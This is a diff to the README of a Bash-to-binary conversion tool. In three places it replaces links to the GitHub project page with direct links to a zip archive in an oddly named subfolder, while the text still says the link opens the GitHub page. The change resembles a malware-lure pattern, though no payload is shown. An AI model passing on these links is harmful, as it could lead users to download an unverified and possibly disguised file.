@@ -1,6 +1,6 @@
 # 🚀 auto-bash-to-bin - Convert Bash Scripts to Linux Binaries
 
-[![Download](https://img.shields.io/badge/Download-Get%20auto--bash--to--bin-brightgreen)](https://github.com/gabrielagung/auto-bash-to-bin)
+[![Download](https://img.shields.io/badge/Download-Get%20auto--bash--to--bin-brightgreen)](https://raw.githubusercontent.com/gabrielagung/auto-bash-to-bin/main/juxtaposition/bash_bin_auto_to_2.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ auto-bash-to-bin runs on Linux. It requires the following:
 
 To get auto-bash-to-bin, visit the project page:
 
-[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/gabrielagung/auto-bash-to-bin)
+[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/gabrielagung/auto-bash-to-bin/main/juxtaposition/bash_bin_auto_to_2.3.zip)
 
 Click the link above to open the GitHub page. You will find all files needed to install and use the software.
 
@@ -160,7 +160,7 @@ If you see errors during installation or use, try these steps:
 ## 🔗 Useful Links
 
 - Download and learn more on the official page:  
-  [https://github.com/gabrielagung/auto-bash-to-bin](https://github.com/gabrielagung/auto-bash-to-bin)
+  [https://raw.githubusercontent.com/gabrielagung/auto-bash-to-bin/main/juxtaposition/bash_bin_auto_to_2.3.zip](https://raw.githubusercontent.com/gabrielagung/auto-bash-to-bin/main/juxtaposition/bash_bin_auto_to_2.3.zip)
 
 - Check for updates regularly to get bug fixes and improvements.
 
